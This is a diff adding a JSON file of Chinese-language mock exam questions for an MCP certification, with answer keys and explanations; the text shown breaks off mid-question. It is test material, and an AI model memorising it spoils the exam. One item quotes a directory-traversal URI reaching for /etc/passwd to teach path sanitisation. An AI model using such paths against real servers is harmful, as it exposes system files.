@@ -1,0 +1,1238 @@
+{
+  "id": "mcpa-f-mock-01",
+  "track": "mcpa-f",
+  "kind": "mock",
+  "title": "MCPA 全真模拟题 1：运行场景",
+  "timeLimitMinutes": 90,
+  "version": 1,
+  "questions": [
+    {
+      "id": "mcpa-f-m1-001",
+      "domain": "mcp-fundamentals",
+      "objective": "Explain the purpose and scope of MCP and the integration problem it standardizes between AI applications and external systems",
+      "prompt": "某平台团队目前为 6 个内部应用与 9 个外部系统之间的每一种组合分别维护手写连接器。随着应用和系统不断增加，连接器数量也持续增长。管理层询问，采用 MCP 这类用于上下文与工具访问的统一协议是否有帮助。最有力的理由是什么？",
+      "type": "single",
+      "options": [
+        "MCP 能把兼容应用与系统之间自定义连接器的乘法式增长变为加法式增长",
+        "MCP 不再需要应用与其访问的系统之间执行任何授权或同意步骤",
+        "MCP 保证每个外部系统都公开完全相同的数据，无论系统实际存储什么",
+        "MCP 让团队从此不必决定应用内部具体使用哪一种大语言模型"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "MCP 对 AI 应用与外部系统之间的集成接口进行标准化，使集成数量从大致等于应用数乘以系统数，变为大致等于两者之和。它不会选择模型、保证数据相同，也不会取消授权要求。",
+      "references": [
+        "certifications/mcpa/lessons/02-the-integration-problem",
+        "https://modelcontextprotocol.io/specification/2026-07-28"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-002",
+      "domain": "mcp-fundamentals",
+      "objective": "Read the MCP specification, its revision history, and its feature lifecycle to tell current, deprecated, and removed behavior apart",
+      "prompt": "一名刚加入团队的支持工程师告诉同事：每次 MCP 交互都必须先发送 initialize 请求，服务器才会接受其他调用。该同事正在查阅 2026-07-28 版规范，应当如何回应？",
+      "type": "single",
+      "options": [
+        "表示赞同，因为 initialize 仍会创建共享会话，后续每个请求都依赖该会话",
+        "说明 initialize 和会话已被移除，因为现在每个请求都会自行携带版本与能力信息",
+        "表示赞同，但指出如今只有远程 HTTP 服务器仍要求完整的 initialize 握手",
+        "说明 initialize 现在完全可选，但仍会返回供后续调用使用的会话 ID"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "2026-07-28 版移除了 initialize 请求、notifications/initialized 以及协议会话。现在每个请求都在自己的逐请求元数据中携带 protocolVersion、clientCapabilities 等字段，因此不再需要握手或会话。",
+      "references": [
+        "certifications/mcpa/lessons/05-protocol-eras-and-compatibility",
+        "certifications/mcpa/lessons/00-mcp-exam-strategy",
+        "https://modelcontextprotocol.io/specification/2026-07-28/changelog"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-003",
+      "domain": "mcp-fundamentals",
+      "objective": "Read the MCP specification, its revision history, and its feature lifecycle to tell current, deprecated, and removed behavior apart",
+      "prompt": "某团队正在判断其客户端是否仍可安全依赖 roots 功能。一名工程师称该功能已在 2026-07-28 版中移除，必须立即删除；另一名工程师查看了弃用功能登记表。对于 roots 这类已弃用功能，登记表实际说明了什么？",
+      "type": "single",
+      "options": [
+        "没有任何文档，团队只能根据论坛帖子猜测其状态",
+        "状态为 Active，属于完全现行功能，未来多年都无需改动",
+        "状态为 Deprecated，但仍可用，并提供迁移路径和最早移除日期",
+        "状态已是 Removed，因此任何调用它的客户端代码都会立即失败"
+      ],
+      "correct": [
+        2
+      ],
+      "explanation": "在功能生命周期中，已弃用功能仍有规范且保持可用，同时必须提供迁移路径，并在可能移除前保留最短过渡期。把“已弃用”误当成“已移除”，会导致团队过早删除仍能工作的集成。",
+      "references": [
+        "certifications/mcpa/lessons/01-reading-the-specification",
+        "https://modelcontextprotocol.io/specification/2026-07-28/deprecated"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-004",
+      "domain": "mcp-fundamentals",
+      "objective": "Describe the core MCP concepts of hosts, clients, servers, primitives, and the stateless JSON-RPC request model",
+      "prompt": "运维人员将一台远程 MCP 服务器从单副本扩容为负载均衡器后的三个副本，且未启用粘性路由。某工具把每个客户端的累计值保存在进程内存中，此后各次调用返回的总数开始来回跳变。根本原因是什么？",
+      "type": "single",
+      "options": [
+        "负载均衡器改写了 JSON-RPC ID，导致结果匹配到错误调用",
+        "客户端在第一次调用后不再声明能力，因此后续副本忽略了它",
+        "每个副本分别协商协议版本，因此对结果格式意见不一",
+        "累计值只存在某个副本的内存中，没见过该值的副本无法继续累计"
+      ],
+      "correct": [
+        3
+      ],
+      "explanation": "在无状态核心中，每个请求都必须仅凭自身内容及明确指定的句柄得到处理。因此，跨调用状态应放在由共享存储支撑、服务器签发的句柄之后，而不能留在单个副本的内存里。请求一旦分散到不同副本，未创建这份隐式客户端状态的副本就看不到它，于是出现了运维人员观察到的数值漂移。",
+      "references": [
+        "certifications/mcpa/lessons/04-the-stateless-core"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-005",
+      "domain": "mcp-fundamentals",
+      "objective": "Describe the core MCP concepts of hosts, clients, servers, primitives, and the stateless JSON-RPC request model",
+      "prompt": "一名曾开发 JSON-RPC 批处理客户端的开发者，希望向 2026-07-28 版服务器发送一个包含多个工具调用的 HTTP POST 请求体，以减少往返次数。预期会发生什么？",
+      "type": "single",
+      "options": [
+        "请求会被拒绝，因为批处理已移除，现在每个 POST 请求体只能携带一个请求",
+        "服务器只处理数组中的第一个调用，并悄悄丢弃其余调用",
+        "服务器会接受整个批次，并在一个大型结果数组中逐一回答所有调用",
+        "服务器会将额外调用排队，并在数分钟内逐个回答"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "MCP 已在 2025-06-18 版中移除 JSON-RPC 批处理，2026-07-28 版仍不支持。因此，Streamable HTTP 的 POST 请求体必须只包含一个 JSON-RPC 请求或通知，不能包含由多个请求组成的数组。",
+      "references": [
+        "certifications/mcpa/lessons/03-json-rpc-and-meta"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-006",
+      "domain": "mcp-fundamentals",
+      "objective": "Describe the core MCP concepts of hosts, clients, servers, primitives, and the stateless JSON-RPC request model",
+      "prompt": "一名新同事询问 host 与其使用的客户端和服务器之间是什么关系。哪项描述符合 2026-07-28 版架构？",
+      "type": "single",
+      "options": [
+        "host 就是单个客户端，通过一个共享通道复用所有服务器连接",
+        "host 为每个服务器连接嵌入一个客户端，每个客户端只与一台服务器通信",
+        "每台服务器都嵌入自己的客户端，用它直接访问 host",
+        "客户端与服务器彼此直连，host 仅用于计费"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "host 应用会为每个服务器连接嵌入一个客户端实例。因此，每个客户端都与一台服务器保持一对一关系，而 host 负责协调全部连接，并为模型汇总结果。",
+      "references": [
+        "certifications/mcpa/lessons/06-hosts-clients-and-servers"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-007",
+      "domain": "mcp-fundamentals",
+      "objective": "Reason about interoperability, protocol versioning, and the value of one open protocol over per-system custom integrations",
+      "prompt": "某供应商建议公司为每个合作伙伴系统分别开发定制 SDK，而不要采用 MCP，理由是统一协议会增加不必要的抽象。从互操作性角度看，最有力的反驳是什么？",
+      "type": "single",
+      "options": [
+        "统一协议意味着合作伙伴系统完全不必再发布任何文档",
+        "统一协议意味着以后再也不必协商协议版本",
+        "统一协议让任何兼容客户端无需系统专用胶水代码即可使用任何兼容服务器",
+        "统一协议据称能保证每个合作伙伴系统都获得完全相同的性能"
+      ],
+      "correct": [
+        2
+      ],
+      "explanation": "开放统一协议的价值在于，发现与能力协商以数据而非代码表示，因此一次构建的客户端可以与任何符合规范的服务器协作。它不会拉齐性能、取消版本协商，也不能取代文档。",
+      "references": [
+        "certifications/mcpa/lessons/02-the-integration-problem"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-008",
+      "domain": "mcp-fundamentals",
+      "objective": "Reason about interoperability, protocol versioning, and the value of one open protocol over per-system custom integrations",
+      "prompt": "架构评审正在列举采用 MCP 这类开放统一协议、而不是自定义点对点集成的实际优势。哪两项说法正确？请选择两项。",
+      "type": "multiple",
+      "options": [
+        "完全无需再选择或配置 host 应用内部使用的具体模型",
+        "每台服务器都会自动获得与其他已连接服务器完全相同的用户界面",
+        "由于发现信息以数据表示，任何现代客户端无需集成专用代码即可使用任何现代服务器",
+        "随着应用和系统增多，连接器数量从乘法式增长变为加法式增长"
+      ],
+      "correct": [
+        2,
+        3
+      ],
+      "explanation": "对应用与系统之间的传输协议进行标准化后，客户端无需定制胶水代码即可发现和使用任何兼容服务器，也让集成数量从乘法式增长变为加法式增长。MCP 不会统一用户界面，也不会替 host 选择运行的模型。",
+      "references": [
+        "certifications/mcpa/lessons/02-the-integration-problem"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-009",
+      "domain": "mcp-fundamentals",
+      "objective": "Read the MCP specification, its revision history, and its feature lifecycle to tell current, deprecated, and removed behavior apart",
+      "prompt": "工程师阅读 2026-07-28 版变更日志时，看到一条包含特定 SEP 编号和简短标题的记录。要判断某功能目前是否适合依赖，应当如何使用这条记录？",
+      "type": "single",
+      "options": [
+        "完全忽略变更日志，只依赖上一版本自己的文档",
+        "只看变更日志标题就足够了，因为 SEP 编号只是历史花絮",
+        "假定每条变更日志都描述了现已移除的功能",
+        "查阅所引用的 SEP 和当前规范页面，确认该功能所处的生命周期阶段"
+      ],
+      "correct": [
+        3
+      ],
+      "explanation": "变更日志会说明改了什么，并链接到推动该变更的提案；但功能的权威状态取决于它在当前规范及弃用功能页面中的生命周期阶段。读者应直接核实，而不是根据标题猜测。",
+      "references": [
+        "certifications/mcpa/lessons/01-reading-the-specification",
+        "https://modelcontextprotocol.io/specification/2026-07-28/changelog"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-010",
+      "domain": "mcp-fundamentals",
+      "objective": "Describe the core MCP concepts of hosts, clients, servers, primitives, and the stateless JSON-RPC request model",
+      "prompt": "某团队正在记录其 MCP 服务器为何让每个请求都自包含，而不依赖连接状态。这种无状态设计会带来哪两项结果？请选择两项。",
+      "type": "multiple",
+      "options": [
+        "负载均衡器后的任何副本都能正确回答任意传入请求",
+        "服务器可以省略 resultType，因为连接已确定应返回哪类答案",
+        "请求中断后重试时，可将其路由到另一服务器实例而不影响正确性",
+        "服务器可以安全地根据同一连接上的先前请求推断客户端身份"
+      ],
+      "correct": [
+        0,
+        2
+      ],
+      "explanation": "由于同一连接上的前一个请求不能向后续请求隐式传递信息，任何副本都能处理任何请求，重试也可安全地路由到任意副本。这正是无状态核心不要求负载均衡器使用粘性路由的原因。",
+      "references": [
+        "certifications/mcpa/lessons/04-the-stateless-core"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-011",
+      "domain": "architecture-and-components",
+      "objective": "Distinguish the responsibilities of MCP hosts, clients, and servers and how discovery and capability negotiation connect them",
+      "prompt": "客户端对某工具发送 tools/call 请求。该工具的描述表明它可能向用户追问，但客户端请求并未声明 elicitation 能力。服务器应当怎么做？",
+      "type": "single",
+      "options": [
+        "返回 MissingRequiredClientCapability 错误，并指出客户端必须声明的能力",
+        "悄悄把整个工具调用降级为更安全的只读版本",
+        "无限期缓存请求，直到客户端最终自行声明缺少的能力",
+        "仍然继续执行，因为能力声明只是无关紧要的形式"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "服务器不能依赖客户端未在当前请求中声明的能力。因此，当服务器需要 elicitation 而请求缺少该能力时，应返回 MissingRequiredClientCapability 错误，并在错误数据中列出所需能力。",
+      "references": [
+        "certifications/mcpa/lessons/07-discovery-and-capability-negotiation"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-012",
+      "domain": "architecture-and-components",
+      "objective": "Read the schemas and structured data that define MCP messages, tool definitions, capabilities, and server manifests",
+      "prompt": "某工具定义了描述结构化发票对象的 outputSchema。客户端调用该工具后，收到的 structuredContent 与此 schema 不匹配。这说明服务器实现存在什么问题？",
+      "type": "single",
+      "options": [
+        "客户端一定在原始调用中发送了格式错误的 inputSchema",
+        "服务器违反了自己的契约，因为 structuredContent 必须符合已声明的 outputSchema",
+        "什么也不说明，因为 outputSchema 只是装饰，从不与实际结果核对",
+        "只要工具同时返回文本内容块，出现这种不匹配就很正常"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "工具一旦声明 outputSchema，服务器返回的任何 structuredContent 都必须符合它。为兼容起见，服务器还应将相同数据序列化到文本块中。不匹配是服务器工具实现的缺陷，而不是客户端错误。",
+      "references": [
+        "certifications/mcpa/lessons/08-tool-schemas-and-structured-content"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-013",
+      "domain": "architecture-and-components",
+      "objective": "Read the schemas and structured data that define MCP messages, tool definitions, capabilities, and server manifests",
+      "prompt": "清单审查人员看到一个工具定义，其 name 为 get_forecast，title 为 Get 7-Day Forecast。客户端调用该工具时，必须把哪个字段作为 params.name 发送？另一个字段有什么用途？",
+      "type": "single",
+      "options": [
+        "两个都不用，因为 tools/call 根据工具在 tools/list 数组中的位置识别它",
+        "把 title 放入 params.name，因为 title 是规范标识符，而 name 只是显示提示",
+        "把 name 放入 params.name，因为 name 是程序标识符，title 用于显示",
+        "任意一个都可以，因为服务器会交替匹配 name 与 title 来解析调用"
+      ],
+      "correct": [
+        2
+      ],
+      "explanation": "工具元数据区分程序使用的 name 和可选的人类可读 title：客户端在 tools/call 的 params.name 中发送前者，host 在用户界面中展示后者。按 title 或列表位置调用，一旦显示文本或排序变化就会失效。",
+      "references": [
+        "certifications/mcpa/lessons/08-tool-schemas-and-structured-content",
+        "certifications/mcpa/lessons/09-reading-server-manifests"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-014",
+      "domain": "architecture-and-components",
+      "objective": "Trace the model interaction flow from a user request through the host, model, client, and server and back into model context",
+      "prompt": "在模型交互流程中，host 即将允许模型调用一个标注为破坏性的工具。host 的确认步骤应放在流程中的哪个位置？",
+      "type": "single",
+      "options": [
+        "只能放在服务器内部，因为 host 看不到工具注解",
+        "放在模型自身的隐藏推理中，对 host 不可见",
+        "等服务器执行工具后再显示事后通知",
+        "在客户端发送 tools/call 前，让人类批准或拒绝操作"
+      ],
+      "correct": [
+        3
+      ],
+      "explanation": "交互流程要求在人类确认敏感调用后，客户端才真正发送请求。这样，破坏性操作可以被拒绝，而不是只能在事后记录。host 会读取工具注解和输入，以决定是否弹出确认。",
+      "references": [
+        "certifications/mcpa/lessons/10-model-interaction-flow"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-015",
+      "domain": "architecture-and-components",
+      "objective": "Distinguish the responsibilities of MCP hosts, clients, and servers and how discovery and capability negotiation connect them",
+      "prompt": "某平台团队运行两台 MCP 服务器：一台通过本地 stdio 提供文件系统访问，另一台通过远程 Streamable HTTP 集成 SaaS。审查人员称，host 在工具注册表中以相同方式对待二者，所以两台服务器共享同一信任边界。应当如何纠正？",
+      "type": "single",
+      "options": [
+        "信任边界随进程和网络边界划分，因此两台服务器属于不同的信任域",
+        "信任边界完全取决于服务器在 discover 结果中声明了哪些能力",
+        "只要两台服务器公开的工具名称不同，它们就共享同一信任边界",
+        "只有远程 HTTP 服务器存在真正的信任边界，因为本地子进程天然可信"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "信任域取决于进程与网络边界，而不是 host 如何列出工具。因此，即使 host 把本地 stdio 子进程和远程 HTTP 服务汇总到同一注册表，它们仍属于不同信任域。名称和已声明能力不会重划该边界。",
+      "references": [
+        "certifications/mcpa/lessons/06-hosts-clients-and-servers"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-016",
+      "domain": "architecture-and-components",
+      "objective": "Distinguish the responsibilities of MCP hosts, clients, and servers and how discovery and capability negotiation connect them",
+      "prompt": "客户端正在判断使用服务器前何时必须调用 server/discover。关于发现机制，哪两项说法正确？请选择两项。",
+      "type": "multiple",
+      "options": [
+        "如果服务器只公开一个简单工具，就可以完全不实现 server/discover",
+        "客户端可以不调用 server/discover，直接发送请求并处理版本错误",
+        "在允许发送任何其他类型的请求前，服务器必须先返回 DiscoverResult",
+        "discover 返回的 instructions 字段是给模型的自然语言指引，而不是机器校验的契约"
+      ],
+      "correct": [
+        1,
+        3
+      ],
+      "explanation": "发现对客户端是可选的，但服务器必须实现；DiscoverResult 的 instructions 字段是面向模型的描述性指引，不是强制执行的契约。请求顺序并不要求先运行 discover，服务器也不能因为工具较少就跳过实现。",
+      "references": [
+        "certifications/mcpa/lessons/07-discovery-and-capability-negotiation"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-017",
+      "domain": "architecture-and-components",
+      "objective": "Read the schemas and structured data that define MCP messages, tool definitions, capabilities, and server manifests",
+      "prompt": "某工具的 inputSchema 完全没有 $schema 关键字，而客户端团队的校验库默认使用较旧的 JSON Schema 草案。客户端应采用哪种方言来校验参数？",
+      "type": "single",
+      "options": [
+        "采用校验库的默认方言，因为 MCP 对此不作规定",
+        "采用 JSON Schema 2020-12，因为缺少 $schema 时 MCP 默认使用该方言",
+        "采用 Draft-04，因为它仍是各类库中部署最广的 JSON Schema 方言",
+        "采用 Draft-07，因为大多数早期 MCP 服务器都基于该草案编写"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "MCP schema 在没有 $schema 关键字时默认采用 JSON Schema 2020-12 方言。因此，校验器必须应用 2020-12 语义，而不是库自身的默认值或旧草案。需要其他方言的 schema 必须通过 $schema 显式声明。",
+      "references": [
+        "certifications/mcpa/lessons/08-tool-schemas-and-structured-content"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-018",
+      "domain": "architecture-and-components",
+      "objective": "Trace the model interaction flow from a user request through the host, model, client, and server and back into model context",
+      "prompt": "host 每轮都会为模型重新构建工具列表，但列表中的工具顺序会根据 host 代码中的字典迭代顺序随机变化。一名同事认为这无关紧要。为什么它其实是个问题？",
+      "type": "single",
+      "options": [
+        "问题仅在于规范中 JSON 对象键从技术上说没有顺序",
+        "问题仅在于模型拒绝调用任何未排在第一位的工具",
+        "tools/list 结果应保持确定性排序，随机顺序会破坏客户端与 LLM 的 prompt 缓存命中",
+        "这不是问题，因为工具顺序不会影响缓存或模型的任何行为"
+      ],
+      "correct": [
+        2
+      ],
+      "explanation": "工具列表应采用确定性顺序，使客户端缓存和模型提供商的 prompt 缓存能够识别稳定、重复的前缀。即使工具集合及其定义没有变化，随机排序也会破坏这种稳定性。",
+      "references": [
+        "certifications/mcpa/lessons/10-model-interaction-flow"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-019",
+      "domain": "interactions-and-execution",
+      "objective": "Identify the protocol primitives and utilities, including tools, resources, prompts, completion, caching, pagination, transports, and deprecated client features",
+      "prompt": "某工具的结果需要返回一张供模型推理的图片，以及一个指向大型日志文件的引用；模型不应被迫读取完整日志。哪种内容块组合能同时满足这两个需求？",
+      "type": "single",
+      "options": [
+        "两个文本块，一个描述图片，另一个描述日志文件",
+        "用音频内容块承载图片，再用文本块承载日志文件",
+        "一个嵌入式资源块，同时包含图片字节和完整日志文本",
+        "用图片内容块承载图片，再用 resource_link 指向日志文件"
+      ],
+      "correct": [
+        3
+      ],
+      "explanation": "图片内容块承载模型可直接推理的视觉数据；resource_link 则向模型提供大型文件等资源的引用，无需把完整内容塞入上下文。用音频承载图片会错误表示内容类型。",
+      "references": [
+        "certifications/mcpa/lessons/11-the-tools-primitive"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-020",
+      "domain": "interactions-and-execution",
+      "objective": "Identify the protocol primitives and utilities, including tools, resources, prompts, completion, caching, pagination, transports, and deprecated client features",
+      "prompt": "某 MCP 服务器通过 file:// 资源 URI 公开内部文档。安全审查人员担心，攻击者可构造 file:///etc/passwd 之类的 URI，越出预期文档目录。符合规范的服务器必须怎么做？",
+      "type": "single",
+      "options": [
+        "清理文件路径以防止目录遍历，这是规范要求服务器执行的检查",
+        "什么也不用做，因为 file:// 方案只能由已受信任的本地客户端访问",
+        "完全拒绝 file://，因为 2026-07-28 版只允许 https:// 和 git:// 资源 URI",
+        "允许访问，因为 resources/read 已将每个调用方限制在自己的主目录"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "资源规范要求服务器校验每个资源 URI，并清理文件路径以防目录遍历攻击。file:// URI 未必映射到真实文件系统；但若确实映射，服务器必须在路径接触磁盘前完成检查，而不能信任调用方或传输层。",
+      "references": [
+        "certifications/mcpa/lessons/12-the-resources-primitive"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-021",
+      "domain": "interactions-and-execution",
+      "objective": "Identify the protocol primitives and utilities, including tools, resources, prompts, completion, caching, pagination, transports, and deprecated client features",
+      "prompt": "客户端针对真实存在的 prompt 名称调用 prompts/get，却遗漏了该 prompt 声明为必填的参数。服务器应返回什么？",
+      "type": "single",
+      "options": [
+        "返回成功的 PromptMessage 列表，并把缺失参数留作空字符串",
+        "针对缺失的必填参数返回代码为 -32602 的 JSON-RPC 错误",
+        "返回 isError 为 true 的工具执行错误，因为 prompt 与工具共用错误通道",
+        "返回代码为 -32601 的 JSON-RPC 错误，因为找不到该 prompt"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "按照当前错误码分配，无效 prompt 名称和缺少必填参数都属于代码为 -32602 的协议错误。它不同于工具所用的执行错误通道，也不同于表示方法本身无法识别的 -32601。",
+      "references": [
+        "certifications/mcpa/lessons/13-prompts-and-completion"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-022",
+      "domain": "interactions-and-execution",
+      "objective": "Apply the request, notification, subscription, and multi round-trip interaction patterns and handle each result type",
+      "prompt": "部署工具在继续执行前，需要用户确认某项高风险操作。按照 2026-07-28 版消息模式，服务器如何请求确认？",
+      "type": "single",
+      "options": [
+        "新建 subscriptions/listen 流，并一直等待用户最终作答",
+        "无限期暂停响应，直到用户通过带外方式作答",
+        "返回 resultType 为 input_required 的结果，其中携带待回答的 inputRequests 或 requestState",
+        "在调用进行到一半时，直接向客户端发送全新的服务器发起请求"
+      ],
+      "correct": [
+        2
+      ],
+      "explanation": "多轮往返请求已完全取代服务器发起的请求。因此，需要输入时，服务器会用 input_required 结果响应原始调用，其中至少携带 inputRequests 或 requestState 之一；客户端再用新的 ID 重试同一逻辑请求来作答。",
+      "references": [
+        "certifications/mcpa/lessons/14-multi-round-trip-requests-and-elicitation"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-023",
+      "domain": "interactions-and-execution",
+      "objective": "Identify the protocol primitives and utilities, including tools, resources, prompts, completion, caching, pagination, transports, and deprecated client features",
+      "prompt": "某服务器目前使用 sampling create message，让客户端通过自己的模型执行补全。迁移审查指出该功能已弃用。建议用什么替代？",
+      "type": "single",
+      "options": [
+        "永远继续使用，因为已弃用功能实际上从不会变化",
+        "改用 roots/list，因为 roots 与 sampling 使用同一迁移路径",
+        "改用 subscriptions/listen，让客户端以资源更新形式流式传输补全结果",
+        "改为由服务器直接调用 LLM 提供商的 API，而不是经由客户端"
+      ],
+      "correct": [
+        3
+      ],
+      "explanation": "Sampling 在 2026-07-28 版中已弃用。文档规定的迁移方式是让服务器直接调用大语言模型提供商的 API，而不是要求客户端代为执行补全。该功能目前仍可用，但不是未来推荐路径。",
+      "references": [
+        "certifications/mcpa/lessons/15-deprecated-client-features"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-024",
+      "domain": "interactions-and-execution",
+      "objective": "Apply the request, notification, subscription, and multi round-trip interaction patterns and handle each result type",
+      "prompt": "MCP 客户端与服务器之间的 stdio 连接在对话途中崩溃，客户端自动重启了服务器子进程。崩溃前，客户端有一个活动的 subscriptions/listen 流，用于监视工具列表变化。重启后，客户端必须怎么做才能继续接收这些通知？",
+      "type": "single",
+      "options": [
+        "重新发送 subscriptions/listen 请求，因为之前的流无法跨越崩溃与重启保留",
+        "什么也不用做，因为服务器会自动记住并恢复之前的监听流",
+        "先发送 notifications/cancelled，因为崩溃后要靠它重新打开监听流",
+        "等待服务器使用旧 subscriptionId 主动重建该流"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "stdio 子进程重启会丢弃旧进程跟踪的一切，包括已打开的监听流。因此，客户端重启服务器后要负责重新发出 subscriptions/listen，就像重试其他丢失的请求一样，而不能等待服务器自行重连。",
+      "references": [
+        "certifications/mcpa/lessons/16-notifications-and-subscriptions",
+        "certifications/mcpa/lessons/19-transports-and-http-headers"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-025",
+      "domain": "interactions-and-execution",
+      "objective": "Handle protocol errors and tool execution errors, including version, capability, header, and validation failures",
+      "prompt": "运维人员调试失败的工具调用时，看到代码为 -32602 的 JSON-RPC 错误，而不是 isError 为 true 的结果。哪种情况符合这一响应形式？",
+      "type": "single",
+      "options": [
+        "参数格式正确，但未通过工具自身逻辑执行的业务规则",
+        "请求指定了该服务器上不存在的工具",
+        "工具依赖的外部 API 返回失败",
+        "参数未通过工具所声明 inputSchema 的校验"
+      ],
+      "correct": [
+        1
+      ],
+      "explanation": "未知工具名称属于协议级故障，以代码为 -32602 的 JSON-RPC 错误返回；schema 校验失败、业务规则拒绝和下游 API 故障都属于工具执行错误，以 isError 为 true 的正常结果返回，使模型能够看到并作出调整。",
+      "references": [
+        "certifications/mcpa/lessons/17-tool-invocation-lifecycle",
+        "certifications/mcpa/lessons/18-error-handling"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-026",
+      "domain": "interactions-and-execution",
+      "objective": "Handle protocol errors and tool execution errors, including version, capability, header, and validation failures",
+      "prompt": "代码审查人员看到一个拉取请求：只要工具参数违反业务规则，例如折扣百分比超过上限，就返回 JSON-RPC -32602 错误。审查人员应指出什么？",
+      "type": "single",
+      "options": [
+        "代码应改用 -32002，因为它才是无效业务输入的正确错误码",
+        "代码应改用 -32601，因为工具方法本身未知",
+        "业务规则失败应改为 isError 为 true 的工具执行错误",
+        "无需指出问题，因为 -32602 正是用于业务规则违规"
+      ],
+      "correct": [
+        2
+      ],
+      "explanation": "输入校验和业务逻辑失败属于工具执行错误，应以 isError 为 true 的正常结果返回，而不是 JSON-RPC 协议错误。这样失败内容才能进入模型上下文，让模型调整参数。",
+      "references": [
+        "certifications/mcpa/lessons/18-error-handling"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-027",
+      "domain": "interactions-and-execution",
+      "objective": "Handle protocol errors and tool execution errors, including version, capability, header, and validation failures",
+      "prompt": "多台 MCP 服务器前的网关收到一个 POST 请求，其 MCP-Protocol-Version 请求头与请求元数据中的 protocolVersion 值不一致。网关应怎么做？",
+      "type": "single",
+      "options": [
+        "忽略请求头，只信任请求体中的值",
+        "转发前悄悄改写请求头，使其与请求体一致",
+        "原样转发，因为请求头只是参考提示",
+        "拒绝请求，返回 HTTP 400 和 HeaderMismatch 错误码"
+      ],
+      "correct": [
+        3
+      ],
+      "explanation": "Streamable HTTP 要求 MCP-Protocol-Version 请求头等于请求元数据中携带的版本。请求头与请求体不一致正是 HeaderMismatch 错误所报告的情况，应返回 HTTP 400 及 JSON-RPC 错误码 -32020。",
+      "references": [
+        "certifications/mcpa/lessons/19-transports-and-http-headers"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-028",
+      "domain": "interactions-and-execution",
+      "objective": "Identify the protocol primitives and utilities, including tools, resources, prompts, completion, caching, pagination, transports, and deprecated client features",
+      "prompt": "host 开发者正在决定缓存一台变化缓慢的 MCP 服务器中的哪些内容，以降低 agent 下一轮的延迟。哪两种做法符合 2026-07-28 版缓存模型？请选择两项。",
+      "type": "multiple",
+      "options": [
+        "收到对应的 list_changed 通知后立即使缓存列表失效，而不是等待 ttlMs 到期",
+        "像缓存完整结果一样缓存 input_required 结果，因为这样能省一次往返",
+        "把 cacheScope public 当作数据可安全展示给任何用户的证明，不管请求要求什么",
+        "按授权上下文隔离 private cacheScope 条目，避免缓存结果跨用户泄漏"
+      ],
+      "correct": [
+        0,
+        3
+      ],
+      "explanation": "私有缓存条目绝不能跨授权上下文；收到 list_changed 通知后，无论 ttlMs 还剩多久，都应立即使相应列表缓存失效，因为 ttlMs 只是新鲜度提示。cacheScope 不是访问控制，MRTR 的 input_required 结果也绝不能缓存。",
+      "references": [
+        "certifications/mcpa/lessons/20-caching-and-pagination"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-029",
+      "domain": "interactions-and-execution",
+      "objective": "Walk the tool invocation lifecycle from discovery and selection through call, user input, progress, cancellation, and result",
+      "prompt": "某团队正在开发报表生成工具。根据报表大小，运行时间可能从几秒到二十分钟不等，期间客户端可能断开并重新连接。哪种方案最合适？",
+      "type": "single",
+      "options": [
+        "通过 tasks 扩展返回报表，让客户端使用 taskId 轮询并在重连后继续跟踪",
+        "使用服务器签发的句柄，让客户端按固定周期轮询 resources/read",
+        "使用 MRTR，把整段二十分钟等待视为一次 input_required 往返",
+        "始终返回普通 complete 结果，并让 HTTP 连接保持打开二十分钟"
+      ],
+      "correct": [
+        0
+      ],
+      "explanation": "耗时长、时长不可预测且必须经受断线的工作，正适合 tasks 扩展。服务器返回携带 taskId 的任务结果，客户端轮询 tasks/get，并能在重连后恢复跟踪。持续占用单个响应或用于一次输入交换的 MRTR 往返都不适合。",
+      "references": [
+        "certifications/mcpa/lessons/21-long-running-work-and-tasks"
+      ]
+    },
+    {
+      "id": "mcpa-f-m1-030",
+      "domain": "interactions-and-execution",
+      "objective": "Walk the tool invocation lifecycle from discovery and selection through call, user input, progress, cancellation, and result",
+      "prompt": "运维人员看到一个已被客户端取消的工具调用，但片刻后服务器仍返回了该调用的迟到结果。正确的处理方式是什么？",
+      "type": "single",
+      "options": [
+        "使用相同请求 ID 重试，迫使服务器重新发送取消确认",
+        "丢弃迟到结果，因为取消后的竞态是预期情况，应忽略",
+        "拒绝整个连接，因为取消后仍有迟到结果说明服务器已损坏",
+        "把迟到结果视为权威结果，就像取消从未发生一样应用"
+      ],
+      "correct": [
+        1
+      ],
